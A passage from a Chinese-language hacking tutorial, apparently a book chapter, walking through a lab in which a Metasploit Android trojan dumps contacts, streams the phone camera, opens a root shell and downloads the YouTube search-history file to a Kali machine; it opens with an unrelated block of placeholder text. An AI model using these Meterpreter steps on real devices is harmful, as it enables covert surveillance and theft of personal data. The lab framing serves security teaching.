

进入`/path/to/xxx`目录，找到`xxx.json`。

在表达式`cvar = avar + bvar`中，加法运算符（`+`）将`avar`与`bvar`相加，得到它们的和`cvar`

在`List.of(arg0, arg1, arg2)`中，`List`接口的工厂方法`of()`接受一系列的元素，返回包含它们的只读列表。

之后我们这样调用`cmd`命令：`cmd arg0 arg1 arg2`。

```
if (condVar > someVal) {console.log("xxx")}
```

---

[content]
```
meterpreter > dump_contacts [*] Fetching 1 contact into list
[*] Contacts list saved to: contacts_dump_20210927103858.txt
```

Meterpreter 将响应它找到的联系人数量，以及在你的 Kali 机器上保存这些联系人的文件名。

2. 在 Kali 虚拟机中打开第二个终端窗口并输入 `cd` 切换到主目录。然后输入命令 `ls con*` 列出 Meterpreter 倾倒在那里的任何联系人文件：

```
kali@kali:~# ls con*
contacts_dump_20210927103858.txt 
```

你会看到一个名为 `contacts_dump_` 后跟时间戳（年、月、日和数字格式的时间）的 `*.txt` 文件。

3. 输入 `cat con` 并按 `TAB` 键自动补全联系人文件名，然后按 `ENTER` 键显示文件内容：

```
kali@kali:~# cat contacts_dump_20210927103858.txt --snip--
#1
Name: Bryson Payne
Number: 404-555-1212
Email: brysonpayne@myuniversity.edu
```

攻击者可以看到智能手机联系人应用中列出的每个人的完整联系人信息，此外还可以阅读你的短信并查看你最近拨打的每个电话！

### 通过摄像头进行间谍活动

如果攻击者获得对你智能手机的远程控制，他们可以劫持设备的摄像头和/或麦克风。正如我们将看到的，这种间谍活动令人不安地容易。

1. 如果你有网络摄像头，请通过虚拟机菜单栏中的 `Devices`▶`Webcams` 将其连接到 Android 虚拟机，并选择其名称。

2. 连接网络摄像头后，重启 Android 虚拟机（选择 `Machine`▶`Reset` 并点击 `reset` 按钮）。然后通过点击 MainActivity 应用重新运行木马。

3. 在 Metasploit 中，在错误 `Meterpreter session closed` 后按 `ENTER`，然后输入命令 `exploit`。

4. 当新的 Meterpreter 会话启动时，输入命令 `webcam_list` 以查看列出的摄像头：

```
meterpreter > webcam_list
1: Back Camera
```

5. 使用命令 `webcam_stream` 查看来自摄像头的实时视频流：

```
meterpreter > webcam_stream
```

网络摄像头将开始（缓慢地）通过 Firefox 浏览器将视频流传输到你的 Kali 虚拟机，直到你关闭网络浏览器视频流并在 Meterpreter 终端中按 `CTRL-C`（在 Windows 上）或 `CONTROL-C`（在 macOS 上）以停止流。

正如你所见，如果你的设备曾通过类似我们构建的漏洞被攻破，攻击者可以从你智能手机的网络摄像头流传输视频，就像他们可以访问你的笔记本电脑或台式机网络摄像头一样。但与你的电脑网络摄像头不同，你可能随身携带智能手机去任何地方，你的朋友和家人也是如此。我们大多数人不想像对待笔记本电脑那样遮盖智能手机的摄像头，因此在我们安装智能手机上的哪些应用以及授予它们哪些权限时，更加要小心。

### 窃取文件和在日志中窥探

就像我们在 Windows 10 黑客攻击中所做的那样，我们可以使用 `upload` 和 `download` 命令从 Android 设备的存储中上传和下载文件。如果用户授予我们超级用户访问权限，我们甚至可以使用设备的 shell 终端访问受保护的敏感文件。

1. 在 Meterpreter 中输入 `shell` 以进入 Android 终端 shell：

```
meterpreter > shell
Process 1 created.
Channel 1 created.
```

2. Android shell 在行首不显示提示符，因此你的光标将位于空白行上。输入命令 `cd /` 和 `ls` 以更改目录到根 `/` 目录并列出设备上的所有文件夹：

```
cd /ls
acct
bugreports
cache
charger
config
d
data--snip--
```

`data` 文件夹包含大量用户数据，包括用户的 YouTube、浏览器和其他应用历史记录文件。还记得我们运行 YouTube 应用并搜索“Bryson Payne TED Talk”吗？如果应用存储了带有最近搜索结果的日志或历史记录文件，只要用户向应用授予管理员或超级用户权限，我们就可以访问这些文件。

3. 在 Meterpreter Android shell 中输入 `su` 以请求超级用户访问权限。

```
su
```

4. 立即在 Android 虚拟机中，你会看到权限窗口弹出，如 [图 9-8](#c09.xhtml#figure9-8) 所示。点击 `Allow` 以授予 Meterpreter 超级用户访问权限。

![Figure 9-8: Giving Meterpreter superuser access](image_fi/502000c09/f09008.png)

图 9-8：授予 Meterpreter 超级用户访问权限

5. 更改目录到 `/data/data/com.google.android.youtube` 并使用 `ls` 列出目录内容：

```
cd /data/data/com.google.android.youtubels
cache
code_cache
databases
files
no_backup
shared_prefs
```

6. `databases` 文件夹包含应用使用的各种文件，包括一个存储 YouTube 搜索历史记录的文件。要找到该文件，请输入命令 `cd databases` 和 `ls`。

```
cd databasels
```

7. 在出现的简短文件列表中，你会找到 `history.db` 文件。运行命令 `cat history.db` 以查看设备的 YouTube 搜索历史记录。

```
cat history.db
����h�!##�mat 3@tablesuggestionssuggestionsCREATE TABLE suggestions (_id INTEGER PRIMARY KEY,display1 TEXT UNIQUE ON CONFLICT REPLACE,display2 TEXT,query TEXT,date LONG)5I#indexsqlite_autoindex_suggestions_1suggestionW--ctableandroid_metada��677bryson payne ted talkbryson payne ted talkl0�/cale TEXT)
��7	bryson payne ted talk
```

由于这是一个特殊的数据库格式文件，并非所有字符都可打印，但请看最后一行或两行——我们搜索的“Bryson Payne TED Talk”以纯文本形式可见！如果你在 YouTube 上搜索其他视频，然后再次运行该最后命令（`cat history.db`），你会看到新结果被添加到文件中。

8. 现在我们将 YouTube 搜索历史记录文件下载到 Kali 虚拟机。首先，我们需要将其复制到 Metasploit 木马应用的 `files` 文件夹：

```
cp /data/data/com.google.android.youtube/databases/history.db /data/data/com.metasploit.stage/files
```

9. 接下来，我们需要授予复制文件的访问权限：

```
chmod 666 /data/data/com.metasploit.stage/files/history.db
```

10. 通过按 `CTRL-C`（在 Mac 上为 `CONTROL-C`）退出 Android shell。Meterpreter 将响应一个提示，询问你是否要终止 `channel` 或 shell 连接。输入 `y`。

```
^C
Terminate channel 1? [y/N] y
```

11. 你现在将回到常规 Meterpreter 提示符，在那里你可以将 YouTube 历史记录文件下载到 Kali 虚拟机的主文件夹（`/home/kali/`）：

```
meterpreter > download history.db
```

12. 在单独的终端窗口中，输入 `ls` 以确认 `history.db` 文件已成功下载。然后输入 `cat history.db`，你将看到与在 Android shell 中看到的相同的文件内容，用户的 YouTube 搜索历史记录以纯文本形式显示。

恶意黑客可以使用此技术保存你的 YouTube 搜索历史记录。然而，如果你是为 FBI 或公司安全团队工作的取证数据分析师，你可以使用相同的技术来发现罪犯是否观看了 YouTube 视频以学习如何制造炸弹或犯下其他罪行。

### 关闭铃声及更多操作

你可以使用 Meterpreter 更改设置，并防止用户将其更改回来。例如，你可以通过在 Meterpreter 中输入以下命令来关闭 Android 虚拟机上的铃声：

```
meterpreter > set_audio_mode -m 0
[*] Ringer mode was changed to 0!
```

在你的 Android 虚拟机中，在主屏幕上向上滑动并选择 `Settings`。搜索“ring”并点击 `Ring volume` 打开声音设置。铃声音量已关闭，如 [图 9-9](#c09.xhtml#figure9-9) 所示。

